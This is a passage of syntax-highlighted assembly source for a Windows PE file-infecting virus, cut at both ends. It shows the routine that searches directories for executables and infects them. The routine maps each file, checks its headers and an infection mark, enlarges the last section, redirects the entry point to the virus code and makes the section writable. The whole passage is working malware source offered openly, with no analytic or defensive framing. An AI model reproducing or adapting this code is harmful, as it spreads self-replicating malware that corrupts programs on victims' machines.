        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">find_data</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; offset of find data struc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">; search handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindNextFileA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; EAX=1 if file found</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">infect_found_file</span><span class="sc0">                    </span><span class="sc1">; if file found, infect it</span><span class="sc0">

</span><span class="sc5">find_close</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindClose</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">exit_infect_directory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">; ----- INFECT FILE ---------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetFileAttributesA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">exit_infect_file</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save attributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; save filename offset</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                                </span><span class="sc1">; normal attributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetFileAttributesA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">restore_attributes</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; template file (shit)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                                </span><span class="sc1">; normal file attributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                  </span><span class="sc1">; open existing</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; no security attributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; no file share flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">                         </span><span class="sc1">; read/write mode</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; filename offset</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFileA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">restore_attributes</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save file handle</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; filehandle to ESI</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastWriteTime</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; filehandle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetFileTime</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; high filesize dword ptr</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; filehandle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetFileSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">workspace</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; name file mapping obj (shit)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; low dword of filesize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; high dword of filesize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">; PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; security attributes (shit)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; filehandle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFileMappingA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; close?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">restore_filetime</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save maphandle</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; map the whole file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; low dword of fileoffset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; high dword of fileoffset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">; read/write access</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; maphandle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapViewOfFile</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">close_filemapping</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save mapbase</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapbase</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"ZM"</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">unmap_file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; new exe header pointer</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0"> </span><span class="sc5">unmap_file</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"EP"</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">unmap_file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; machine type - we only</span><span class="sc0">
                                                </span><span class="sc1">; infect files for intel CPUs</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14Ch</span><span class="sc0">                            </span><span class="sc1">; 386 ?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc5">unmap_file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14Eh</span><span class="sc0">                            </span><span class="sc1">; pentium ?</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0"> </span><span class="sc5">unmap_file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; characteristics</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                              </span><span class="sc1">; is file an executable image?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">unmap_file</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000h</span><span class="sc0">                          </span><span class="sc1">; don't infect DLLs/drivers</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">unmap_file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">5Ch</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; subsystem</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                               </span><span class="sc1">; Win32 GUI application?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">subsystem_ok</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                               </span><span class="sc1">; Win32 console app ?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">unmap_file</span><span class="sc0">
</span><span class="sc5">subsystem_ok</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">      </span><span class="sc1">; check for our infection mark</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">unmap_file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EDX=SectionAlign</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">aligned_filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; ECX=size of optional header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">; add offset of PE header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">                            </span><span class="sc1">; add size of file header</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; EDX=number of sections</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">; EDX=number of last section</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">                      </span><span class="sc1">; EDX=size of n-1 sect.-hdrs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">; ECX=last sect.-hdr offset</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; PointerToRawData</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EDX=SectionAlign</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">align_eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">aligned_filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">unmap_file</span><span class="sc0">                          </span><span class="sc1">; file has overlays?</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; EDI=VirtualSize of last sect</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; If VirtualSize=0, this</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">VirtualSize_OK</span><span class="sc0">                      </span><span class="sc1">; means that VirtualSize=</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; SizeOfRawData</span><span class="sc0">
</span><span class="sc5">VirtualSize_OK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">; EAX=old VirtualSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_virtual_size</span><span class="sc0">             </span><span class="sc1">; EAX=new VirtualSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; store it</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; add VirtualAddress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EDX=SectionAlign</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">align_eax</span><span class="sc0">                          </span><span class="sc1">; EAX=new Imagesize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; imagesize big enough?</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0"> </span><span class="sc5">imagesize_ok</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; update imagesize</span><span class="sc0">
</span><span class="sc5">imagesize_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">; EAX=old VirtualSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_raw_size</span><span class="sc0">                 </span><span class="sc1">; EAX=new SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EDX=FileAlign</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">align_eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; save new SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; add PointerToRawData</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; save new filesize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">; EAX=old VirtualSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; Add VirtualAddress</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_RVA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_entry_RVA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_RVA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; save VirusRVA</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; set new entrypoint</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_entry_RVA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; save old entrypoint</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">      </span><span class="sc1">; make section read/write</span><span class="sc0">

